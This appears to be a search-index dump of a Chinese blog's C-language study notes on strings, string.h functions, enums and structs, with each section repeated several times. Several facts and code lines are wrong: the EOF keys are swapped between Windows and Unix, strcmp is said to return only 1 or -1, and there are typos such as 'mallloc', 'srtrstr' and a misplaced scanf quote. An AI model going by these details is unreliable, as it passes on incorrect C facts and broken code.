int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#安全的输入"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#常见错误"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#空字符串"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符串数组"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#程序参数"},{"categories":["Programing"],"content":"\r10.2字符串函数\rputchar int putchar(int c); 向标准输出写一个字符 返回写了几个字符，EOF(-1)表示写失败 getchar int getchar(void); 从标准输入读入一个字符 返回类型是int是为了返回EOF(-1) 输入结束 Windows ： CTRL+D Unix：CTRL+Z ","date":"2023-11-17","objectID":"/c_language_notes/:10:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#102字符串函数"},{"categories":["Programing"],"content":"\r10.2字符串函数\rputchar int putchar(int c); 向标准输出写一个字符 返回写了几个字符，EOF(-1)表示写失败 getchar int getchar(void); 从标准输入读入一个字符 返回类型是int是为了返回EOF(-1) 输入结束 Windows ： CTRL+D Unix：CTRL+Z ","date":"2023-11-17","objectID":"/c_language_notes/:10:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#putchar-1"},{"categories":["Programing"],"content":"\r10.2字符串函数\rputchar int putchar(int c); 向标准输出写一个字符 返回写了几个字符，EOF(-1)表示写失败 getchar int getchar(void); 从标准输入读入一个字符 返回类型是int是为了返回EOF(-1) 输入结束 Windows ： CTRL+D Unix：CTRL+Z ","date":"2023-11-17","objectID":"/c_language_notes/:10:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#getchar-1"},{"categories":["Programing"],"content":"\rstring.h文件头\rstrlen size_t strlen(const char *s); 返回s的字符串长度(不包括结尾的0) #include \u003cstdio.h\u003e int main() { char line[] = \"hello\"; printf(\"strlen=%lu\\n\", strlen(line)); printf(\"sizeof=%lu\\n\", sizeof(line)); return 0; } strlen=5，sizeof=6 (字符串数组结尾有\\0) strcmp int strcmp(const char *s1,const char *s2); 比较两个字符串，返回： 0:s1==s2 1:s1\u003es2 -1:s1\u003cs2 strcpy char *strcpy(char *restrict dst,const char *restrict src); 把src的字符串拷贝到dst restrict表明src和dst不重叠 返回dst 为了能链起代码来 复制一个字符串(复制字符串而不是指针) char* dst = (char* ) mallloc (strlen (src)+1); strcpy(dst,src); strcat char * strcat(char *restrict s1,const char *restrict s2); 把s2拷贝到s1的后面，接成一个长的字符串 返回s1 (s1必须具有足够的空间) 安全问题strcpy和strcat都可能出现安全问题 (如果目的地没有足够的空间) 字符串中找字符 char * strchr(const char *s,int c); char * strchr(const char *s,int c); //从右边找回来 返回NULL表示没有找到 字符串中找字符串 char *srtrstr(const char *s1,const char *s2); char *strcasestr(const char *s1,const char* s2); //忽略大小写 后面的知识感觉现阶段要求没那么深，水一水吧 ","date":"2023-11-17","objectID":"/c_language_notes/:10:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#stringh文件头"},{"categories":["Programing"],"content":"\rstring.h文件头\rstrlen size_t strlen(const char *s); 返回s的字符串长度(不包括结尾的0) #include int main() { char line[] = \"hello\"; printf(\"strlen=%lu\\n\", strlen(line)); printf(\"sizeof=%lu\\n\", sizeof(line)); return 0; } strlen=5，sizeof=6 (字符串数组结尾有\\0) strcmp int strcmp(const char *s1,const char *s2); 比较两个字符串，返回： 0:s1==s2 1:s1\u003es2 -1:s1","date":"2023-11-17","objectID":"/c_language_notes/:10:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#strlen"},{"categories":["Programing"],"content":"\rstring.h文件头\rstrlen size_t strlen(const char *s); 返回s的字符串长度(不包括结尾的0) #include int main() { char line[] = \"hello\"; printf(\"strlen=%lu\\n\", strlen(line)); printf(\"sizeof=%lu\\n\", sizeof(line)); return 0; } strlen=5，sizeof=6 (字符串数组结尾有\\0) strcmp int strcmp(const char *s1,const char *s2); 比较两个字符串，返回： 0:s1==s2 1:s1\u003es2 -1:s1","date":"2023-11-17","objectID":"/c_language_notes/:10:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#strcmp"},{"categories":["Programing"],"content":"\rstring.h文件头\rstrlen size_t strlen(const char *s); 返回s的字符串长度(不包括结尾的0) #include int main() { char line[] = \"hello\"; printf(\"strlen=%lu\\n\", strlen(line)); printf(\"sizeof=%lu\\n\", sizeof(line)); return 0; } strlen=5，sizeof=6 (字符串数组结尾有\\0) strcmp int strcmp(const char *s1,const char *s2); 比较两个字符串，返回： 0:s1==s2 1:s1\u003es2 -1:s1","date":"2023-11-17","objectID":"/c_language_notes/:10:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#strcpy"},{"categories":["Programing"],"content":"\rstring.h文件头\rstrlen size_t strlen(const char *s); 返回s的字符串长度(不包括结尾的0) #include int main() { char line[] = \"hello\"; printf(\"strlen=%lu\\n\", strlen(line)); printf(\"sizeof=%lu\\n\", sizeof(line)); return 0; } strlen=5，sizeof=6 (字符串数组结尾有\\0) strcmp int strcmp(const char *s1,const char *s2); 比较两个字符串，返回： 0:s1==s2 1:s1\u003es2 -1:s1","date":"2023-11-17","objectID":"/c_language_notes/:10:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#复制一个字符串复制字符串而不是指针"},{"categories":["Programing"],"content":"\rstring.h文件头\rstrlen size_t strlen(const char *s); 返回s的字符串长度(不包括结尾的0) #include int main() { char line[] = \"hello\"; printf(\"strlen=%lu\\n\", strlen(line)); printf(\"sizeof=%lu\\n\", sizeof(line)); return 0; } strlen=5，sizeof=6 (字符串数组结尾有\\0) strcmp int strcmp(const char *s1,const char *s2); 比较两个字符串，返回： 0:s1==s2 1:s1\u003es2 -1:s1","date":"2023-11-17","objectID":"/c_language_notes/:10:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#strcat"},{"categories":["Programing"],"content":"\rstring.h文件头\rstrlen size_t strlen(const char *s); 返回s的字符串长度(不包括结尾的0) #include int main() { char line[] = \"hello\"; printf(\"strlen=%lu\\n\", strlen(line)); printf(\"sizeof=%lu\\n\", sizeof(line)); return 0; } strlen=5，sizeof=6 (字符串数组结尾有\\0) strcmp int strcmp(const char *s1,const char *s2); 比较两个字符串，返回： 0:s1==s2 1:s1\u003es2 -1:s1","date":"2023-11-17","objectID":"/c_language_notes/:10:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#安全问题"},{"categories":["Programing"],"content":"\rstring.h文件头\rstrlen size_t strlen(const char *s); 返回s的字符串长度(不包括结尾的0) #include int main() { char line[] = \"hello\"; printf(\"strlen=%lu\\n\", strlen(line)); printf(\"sizeof=%lu\\n\", sizeof(line)); return 0; } strlen=5，sizeof=6 (字符串数组结尾有\\0) strcmp int strcmp(const char *s1,const char *s2); 比较两个字符串，返回： 0:s1==s2 1:s1\u003es2 -1:s1","date":"2023-11-17","objectID":"/c_language_notes/:10:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符串中找字符"},{"categories":["Programing"],"content":"\rstring.h文件头\rstrlen size_t strlen(const char *s); 返回s的字符串长度(不包括结尾的0) #include int main() { char line[] = \"hello\"; printf(\"strlen=%lu\\n\", strlen(line)); printf(\"sizeof=%lu\\n\", sizeof(line)); return 0; } strlen=5，sizeof=6 (字符串数组结尾有\\0) strcmp int strcmp(const char *s1,const char *s2); 比较两个字符串，返回： 0:s1==s2 1:s1\u003es2 -1:s1","date":"2023-11-17","objectID":"/c_language_notes/:10:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符串中找字符串"},{"categories":["Programing"],"content":"\r11.1结构类型\r枚举是一种用户定义的数据类型，关键字enum 语法： enum 枚举类型名字 {名字0,.....,名字n}； 枚举类型名字通常并不真的使用，要用的是大括号里的名字，因为它们就是常量符号，它们的类型是int，值则依次从0到n enum colors {red, yellow,green}; 就创建了三个常量，red的值是0，yellow是1，green是2 当需要一些可以排列起来的常量时，定义枚举的意义就是给了这些常量值名字 #include \u003cstdio.h\u003e enum color {red,yellow,green}; void f(enum color c); int main() { enum color t = red; scanf_s(\"%d\", \u0026t); f(t); return 0; } void f(enum color c) { printf(\"%d\\n\", c); } 枚举量声明枚举量的时候可以指定值 enum COLOR {RED=1,YELLOW,GREEN = 5}; 这样的话，RED是1，YELLOW是2，GREEN是5，3和4就直接跳过了 枚举只是int即使给枚举类型的变量赋不存在的整数值也没有任何warning或error 虽然枚举类型可以当做类型使用，但实际上不好用 如果有意义上排比的名字，用枚举比const int 方便 枚举比宏(macro)号，因为枚举有int类型 ","date":"2023-11-17","objectID":"/c_language_notes/:11:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#111结构类型"},{"categories":["Programing"],"content":"\r11.1结构类型\r枚举是一种用户定义的数据类型，关键字enum 语法： enum 枚举类型名字 {名字0,.....,名字n}； 枚举类型名字通常并不真的使用，要用的是大括号里的名字，因为它们就是常量符号，它们的类型是int，值则依次从0到n enum colors {red, yellow,green}; 就创建了三个常量，red的值是0，yellow是1，green是2 当需要一些可以排列起来的常量时，定义枚举的意义就是给了这些常量值名字 #include enum color {red,yellow,green}; void f(enum color c); int main() { enum color t = red; scanf_s(\"%d\", \u0026t); f(t); return 0; } void f(enum color c) { printf(\"%d\\n\", c); } 枚举量声明枚举量的时候可以指定值 enum COLOR {RED=1,YELLOW,GREEN = 5}; 这样的话，RED是1，YELLOW是2，GREEN是5，3和4就直接跳过了 枚举只是int即使给枚举类型的变量赋不存在的整数值也没有任何warning或error 虽然枚举类型可以当做类型使用，但实际上不好用 如果有意义上排比的名字，用枚举比const int 方便 枚举比宏(macro)号，因为枚举有int类型 ","date":"2023-11-17","objectID":"/c_language_notes/:11:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#枚举"},{"categories":["Programing"],"content":"\r11.1结构类型\r枚举是一种用户定义的数据类型，关键字enum 语法： enum 枚举类型名字 {名字0,.....,名字n}； 枚举类型名字通常并不真的使用，要用的是大括号里的名字，因为它们就是常量符号，它们的类型是int，值则依次从0到n enum colors {red, yellow,green}; 就创建了三个常量，red的值是0，yellow是1，green是2 当需要一些可以排列起来的常量时，定义枚举的意义就是给了这些常量值名字 #include enum color {red,yellow,green}; void f(enum color c); int main() { enum color t = red; scanf_s(\"%d\", \u0026t); f(t); return 0; } void f(enum color c) { printf(\"%d\\n\", c); } 枚举量声明枚举量的时候可以指定值 enum COLOR {RED=1,YELLOW,GREEN = 5}; 这样的话，RED是1，YELLOW是2，GREEN是5，3和4就直接跳过了 枚举只是int即使给枚举类型的变量赋不存在的整数值也没有任何warning或error 虽然枚举类型可以当做类型使用，但实际上不好用 如果有意义上排比的名字，用枚举比const int 方便 枚举比宏(macro)号，因为枚举有int类型 ","date":"2023-11-17","objectID":"/c_language_notes/:11:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#枚举量"},{"categories":["Programing"],"content":"\r11.1结构类型\r枚举是一种用户定义的数据类型，关键字enum 语法： enum 枚举类型名字 {名字0,.....,名字n}； 枚举类型名字通常并不真的使用，要用的是大括号里的名字，因为它们就是常量符号，它们的类型是int，值则依次从0到n enum colors {red, yellow,green}; 就创建了三个常量，red的值是0，yellow是1，green是2 当需要一些可以排列起来的常量时，定义枚举的意义就是给了这些常量值名字 #include enum color {red,yellow,green}; void f(enum color c); int main() { enum color t = red; scanf_s(\"%d\", \u0026t); f(t); return 0; } void f(enum color c) { printf(\"%d\\n\", c); } 枚举量声明枚举量的时候可以指定值 enum COLOR {RED=1,YELLOW,GREEN = 5}; 这样的话，RED是1，YELLOW是2，GREEN是5，3和4就直接跳过了 枚举只是int即使给枚举类型的变量赋不存在的整数值也没有任何warning或error 虽然枚举类型可以当做类型使用，但实际上不好用 如果有意义上排比的名字，用枚举比const int 方便 枚举比宏(macro)号，因为枚举有int类型 ","date":"2023-11-17","objectID":"/c_language_notes/:11:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#枚举只是int"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include\u003cstdio.h\u003e int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include \u003cstdio.h\u003e struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#112结构"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#声明结构类型"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#声明结构的形式"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; 